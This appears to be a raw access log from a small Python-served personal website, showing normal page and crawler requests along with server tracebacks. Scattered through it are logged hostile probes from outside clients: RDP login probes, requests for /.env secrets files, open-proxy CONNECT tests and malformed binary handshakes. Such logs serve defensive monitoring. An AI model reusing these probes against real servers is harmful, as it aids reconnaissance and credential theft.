+157.254.20.101 - - [07/Apr/2024 20:54:31] "GET /img/202404072048.png HTTP/1.1" 304 -
+157.254.20.101 - - [07/Apr/2024 20:55:32] "GET /project/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:55:34] "GET /favicon-32x32.png HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:55:46] "GET /posts/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:55:54] "GET /posts/%E5%85%A8%E6%A0%88%E8%B5%84%E6%BA%90/ HTTP/1.1" 200 -
+52.167.144.8 - - [07/Apr/2024 21:54:45] "GET /resource/list-infostream-src/ HTTP/1.1" 200 -
+79.124.49.214 - - [07/Apr/2024 22:07:16] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.214 - - [07/Apr/2024 22:07:16] "  /*à     Cookie: mstshash=Administr" 400 -
+115.231.78.7 - - [07/Apr/2024 23:38:54] code 400, message Bad request version ('F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
+115.231.78.7 - - [07/Apr/2024 23:38:54] "   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      " 400 -
+52.167.144.145 - - [07/Apr/2024 23:52:21] "GET /resource/%E6%90%AC%E5%AE%B6/ HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 00:01:57] "GET / HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 00:01:57] "GET /css/reset.css HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 00:01:57] "GET /css/smigle.css HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 00:01:58] "GET /css/font.css HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 00:01:59] "GET /images/wxf.jpg HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 00:02:00] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 00:02:00] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 00:02:13] "GET /resource/health/ HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 00:02:15] "GET /img/%E7%94%9F%E6%B4%BB%E6%96%B9%E5%BC%8F%E6%B2%BB%E7%96%97%E6%85%A2%E6%80%A7%E7%97%85_2023-10-20_10-45-28.png HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 00:02:33] "GET /project/ HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 00:02:37] "GET /resource/%E5%9F%BA%E5%87%86%E6%AF%94%E5%AF%B9+%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/ HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 00:02:53] "GET /about/ HTTP/1.1" 200 -
+87.246.7.78 - - [08/Apr/2024 00:04:07] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+87.246.7.78 - - [08/Apr/2024 00:04:07] "  /*à     Cookie: mstshash=Administr" 400 -
+79.124.56.190 - - [08/Apr/2024 00:13:28] code 404, message File not found
+79.124.56.190 - - [08/Apr/2024 00:13:28] "GET http://ip-api.com/json/ HTTP/1.1" 404 -
+40.77.167.144 - - [08/Apr/2024 00:18:05] "GET /posts/%E6%AD%A3%E5%88%99%E8%AF%AD%E6%B3%95/ HTTP/1.1" 200 -
+58.213.84.174 - - [08/Apr/2024 01:30:22] code 400, message Bad request syntax ('SSH-2.0-OpenSSH')
+58.213.84.174 - - [08/Apr/2024 01:30:22] "SSH-2.0-OpenSSH" 400 -
+79.124.49.202 - - [08/Apr/2024 02:38:28] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.202 - - [08/Apr/2024 02:38:28] "  /*à     Cookie: mstshash=Administr" 400 -
+192.241.231.42 - - [08/Apr/2024 02:39:39] code 400, message Bad request version ('À\x14À')
+192.241.231.42 - - [08/Apr/2024 02:39:39] " {  wotLðñbe¨àHýÚKý¦)ÈË¿¤Q  À/À+ÀÀÀÀ	ÀÀ" 400 -
+101.132.164.61 - - [08/Apr/2024 03:03:00] code 404, message File not found
+101.132.164.61 - - [08/Apr/2024 03:03:00] "GET /.env HTTP/1.1" 404 -
+198.199.102.31 - - [08/Apr/2024 03:14:39] code 400, message Bad request syntax ('MGLNDD_117.50.186.154_8000')
+198.199.102.31 - - [08/Apr/2024 03:14:39] "MGLNDD_117.50.186.154_8000" 400 -
+40.77.167.36 - - [08/Apr/2024 03:18:07] "GET /project/ HTTP/1.1" 200 -
+157.55.39.52 - - [08/Apr/2024 03:20:34] "GET /resource/%E7%A6%8F%E6%A0%BC%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+157.55.39.52 - - [08/Apr/2024 03:20:35] "GET /resource/%E5%9F%BA%E5%87%86%E6%AF%94%E5%AF%B9+%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/ HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('206.168.34.34', 38158)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+206.168.34.34 - - [08/Apr/2024 03:37:50] "GET / HTTP/1.1" 200 -
+206.168.34.34 - - [08/Apr/2024 03:37:54] "GET / HTTP/1.1" 200 -
+206.168.34.34 - - [08/Apr/2024 03:37:54] code 505, message Invalid HTTP version (2.0)
+206.168.34.34 - - [08/Apr/2024 03:37:54] "PRI * HTTP/2.0" 505 -
+206.168.34.34 - - [08/Apr/2024 03:37:55] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+206.168.34.34 - - [08/Apr/2024 03:37:56] "GET /favicon-32x32.png HTTP/1.1" 200 -
+206.168.34.34 - - [08/Apr/2024 03:37:58] "GET /favicon-16x16.png HTTP/1.1" 200 -
+206.168.34.34 - - [08/Apr/2024 03:37:59] "GET /favicon.ico HTTP/1.1" 200 -
+94.156.71.232 - - [08/Apr/2024 07:10:35] code 501, message Unsupported method ('CONNECT')
+94.156.71.232 - - [08/Apr/2024 07:10:35] "CONNECT 45.61.137.126:7227 HTTP/1.1" 501 -
+157.254.20.101 - - [08/Apr/2024 07:41:58] "GET / HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 07:41:58] "GET /css/reset.css HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 07:41:58] "GET /css/smigle.css HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 07:41:58] "GET /css/font.css HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 07:41:58] "GET /images/wxf.jpg HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 07:42:00] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 07:42:00] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 07:42:02] "GET /project/ HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 10955)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+157.254.20.101 - - [08/Apr/2024 07:42:03] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 07:42:03] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 07:42:09] "GET /resource/%E7%A6%8F%E6%A0%BC%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 07:42:10] "GET /img/1712492720_Bdgeohw2.jpg HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 07:42:11] "GET /img/202404072047.png HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 07:42:11] "GET /img/202404072048.png HTTP/1.1" 200 -
+52.167.144.22 - - [08/Apr/2024 08:05:15] "GET /resource/%E6%90%AC%E5%AE%B6/ HTTP/1.1" 200 -
+64.62.156.32 - - [08/Apr/2024 08:09:06] "GET / HTTP/1.1" 200 -
+64.62.156.32 - - [08/Apr/2024 08:09:15] "GET /favicon.ico HTTP/1.1" 200 -
+64.62.156.29 - - [08/Apr/2024 08:09:20] code 404, message File not found
+64.62.156.29 - - [08/Apr/2024 08:09:20] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+64.62.156.36 - - [08/Apr/2024 08:09:23] code 501, message Unsupported method ('CONNECT')
+64.62.156.36 - - [08/Apr/2024 08:09:23] "CONNECT www.shadowserver.org:443 HTTP/1.1" 501 -
+----------------------------------------
+Exception occurred during processing of request from ('167.94.146.51', 54616)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+167.94.146.51 - - [08/Apr/2024 08:23:00] "GET / HTTP/1.1" 200 -
+167.94.146.51 - - [08/Apr/2024 08:23:04] "GET / HTTP/1.1" 200 -
+167.94.146.51 - - [08/Apr/2024 08:23:05] code 505, message Invalid HTTP version (2.0)
+167.94.146.51 - - [08/Apr/2024 08:23:05] "PRI * HTTP/2.0" 505 -
+167.94.146.51 - - [08/Apr/2024 08:23:05] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+167.94.146.51 - - [08/Apr/2024 08:23:06] "GET /favicon-32x32.png HTTP/1.1" 200 -
+167.94.146.51 - - [08/Apr/2024 08:23:07] "GET /favicon-16x16.png HTTP/1.1" 200 -
+167.94.146.51 - - [08/Apr/2024 08:23:09] "GET /favicon.ico HTTP/1.1" 200 -
+81.71.5.172 - - [08/Apr/2024 08:24:12] "GET /resource/%E5%9F%BA%E5%87%86%E6%AF%94%E5%AF%B9+%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/ HTTP/1.1" 200 -
+87.236.176.91 - - [08/Apr/2024 08:30:24] "GET / HTTP/1.1" 200 -
+87.236.176.173 - - [08/Apr/2024 08:30:25] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+87.236.176.222 - - [08/Apr/2024 08:30:25] "GET /favicon-16x16.png HTTP/1.1" 200 -
+87.236.176.195 - - [08/Apr/2024 08:30:25] "GET /favicon-32x32.png HTTP/1.1" 200 -
+87.120.84.131 - - [08/Apr/2024 08:45:57] code 501, message Unsupported method ('CONNECT')
+87.120.84.131 - - [08/Apr/2024 08:45:57] "CONNECT 45.61.137.126:7227 HTTP/1.1" 501 -
+----------------------------------------
+Exception occurred during processing of request from ('35.203.210.46', 56397)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+194.26.135.75 - - [08/Apr/2024 10:05:59] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+194.26.135.75 - - [08/Apr/2024 10:05:59] "  /*à     Cookie: mstshash=Administr" 400 -
+157.254.20.101 - - [08/Apr/2024 10:35:02] "GET / HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:35:06] "GET /project/ HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:35:11] "GET /resource/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8+%E6%90%AD%E7%A7%AF%E6%9C%A8/ HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:35:12] "GET /img/Snipaste_2024-04-02_00-52-21.png HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:35:12] "GET /img/Snipaste_2024-04-02_01-13-36.png HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:35:12] "GET /img/Snipaste_2024-04-02_01-14-11.png HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:35:12] "GET /img/Snipaste_2024-04-02_01-14-36.png HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:35:12] "GET /img/Snipaste_2024-04-02_01-14-26.png HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:35:12] "GET /img/Snipaste_2024-04-02_01-14-19.png HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 19727)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 10901)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 19549)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 20645)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 31913)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+157.254.20.101 - - [08/Apr/2024 10:36:34] "GET /project/ HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:36:37] "GET /favicon-32x32.png HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:36:38] "GET /resource/%E5%85%B3%E9%94%AE%E7%82%B9/ HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:37:15] "GET /resource/%E5%85%B3%E9%94%AE%E7%82%B9/ HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:38:29] "GET /resource/%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%80%9D%E8%80%83/ HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:38:30] "GET /img/2023-08-19_08-15-46.png HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:38:30] "GET /img/2023-08-19_07-23-03.png HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:39:36] "GET /resource/%E5%85%B3%E9%94%AE%E7%82%B9/ HTTP/1.1" 200 -
+157.254.20.101 - - [08/Apr/2024 10:39:58] "GET /resource/%E5%85%B3%E9%94%AE%E7%82%B9/ HTTP/1.1" 200 -
+198.235.24.205 - - [08/Apr/2024 11:06:32] "GET / HTTP/1.1" 200 -
+185.192.71.37 - - [08/Apr/2024 11:16:33] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x06d@d\x00¾Cº/»\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+185.192.71.37 - - [08/Apr/2024 11:16:33] "   TZ          0I    d@d ¾Cº/»                                                 " 400 -
+185.192.71.37 - - [08/Apr/2024 11:16:33] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x06d@d\x00¾Cº/»\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+185.192.71.37 - - [08/Apr/2024 11:16:33] "   TZ          0I    d@d ¾Cº/»                                                 " 400 -
+185.192.71.37 - - [08/Apr/2024 11:16:33] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x06d@d\x00¾Cº/»\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+185.192.71.37 - - [08/Apr/2024 11:16:33] "   TZ          0I    d@d ¾Cº/»                                                 " 400 -
+178.159.37.98 - - [08/Apr/2024 11:30:43] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [08/Apr/2024 11:30:43] "  /*à     Cookie: mstshash=Administr" 400 -
+52.167.144.57 - - [08/Apr/2024 11:37:16] code 404, message File not found
+52.167.144.57 - - [08/Apr/2024 11:37:16] "GET /robots.txt HTTP/1.1" 404 -
+52.167.144.216 - - [08/Apr/2024 11:37:27] "GET /resource/%E8%AE%BE%E8%AE%A1%E4%BA%BA%E7%94%9F-%E7%BA%A0%E5%81%8F/ HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('78.128.114.22', 62098)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+83.97.73.104 - - [08/Apr/2024 12:57:35] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.97.73.104 - - [08/Apr/2024 12:57:35] "  /*à     Cookie: mstshash=Administr" 400 -
+178.159.37.98 - - [08/Apr/2024 13:01:40] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [08/Apr/2024 13:01:40] "  /*à     Cookie: mstshash=Administr" 400 -
+35.203.210.4 - - [08/Apr/2024 13:11:36] code 400, message Bad request syntax ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03')
+35.203.210.4 - - [08/Apr/2024 13:11:36] " î  ê" 400 -
+35.203.210.4 - - [08/Apr/2024 13:11:36] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03weë.´\x04Ú\x00<\x16_-\x07í×\x86Q?B\x92\x9e\x14öºEÇÄ\x19AD2Ï\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+35.203.210.4 - - [08/Apr/2024 13:11:36] " Ê  Æweë.´Ú <_-í×Q?BöºEÇÄAD2Ï  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ" 400 -
+92.249.48.24 - - [08/Apr/2024 13:23:04] code 501, message Unsupported method ('CONNECT')
+92.249.48.24 - - [08/Apr/2024 13:23:04] "CONNECT 45.61.137.126:7227 HTTP/1.1" 501 -
+185.161.248.141 - - [08/Apr/2024 13:48:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.161.248.141 - - [08/Apr/2024 13:48:05] "  /*à     Cookie: mstshash=Administr" 400 -
+185.161.248.148 - - [08/Apr/2024 13:58:44] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.161.248.148 - - [08/Apr/2024 13:58:44] "  /*à     Cookie: mstshash=Administr" 400 -
+194.26.135.75 - - [08/Apr/2024 14:04:40] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+194.26.135.75 - - [08/Apr/2024 14:04:40] "  /*à     Cookie: mstshash=Administr" 400 -
+194.26.135.75 - - [08/Apr/2024 14:04:40] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+194.26.135.75 - - [08/Apr/2024 14:04:40] "  /*à     Cookie: mstshash=Administr" 400 -
+40.77.167.143 - - [08/Apr/2024 14:45:39] "GET /posts/%E6%AD%A3%E5%88%99%E8%AF%AD%E6%B3%95/ HTTP/1.1" 200 -
+87.246.7.78 - - [08/Apr/2024 14:57:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+87.246.7.78 - - [08/Apr/2024 14:57:04] "  /*à     Cookie: mstshash=Administr" 400 -
+117.33.147.39 - - [08/Apr/2024 15:35:13] code 404, message File not found
+117.33.147.39 - - [08/Apr/2024 15:35:13] "GET /.env HTTP/1.1" 404 -
+207.46.13.107 - - [08/Apr/2024 16:29:10] code 404, message File not found
+207.46.13.107 - - [08/Apr/2024 16:29:10] "GET /sitemap.xml.gz HTTP/1.1" 404 -
+79.124.49.202 - - [08/Apr/2024 17:02:56] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.202 - - [08/Apr/2024 17:02:56] "  /*à     Cookie: mstshash=Administr" 400 -
+87.236.176.82 - - [08/Apr/2024 18:38:57] "GET / HTTP/1.1" 200 -
+87.236.176.217 - - [08/Apr/2024 18:38:59] "GET /favicon-32x32.png HTTP/1.1" 200 -
+87.236.176.120 - - [08/Apr/2024 18:38:59] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+87.236.176.87 - - [08/Apr/2024 18:38:59] "GET /favicon-16x16.png HTTP/1.1" 200 -
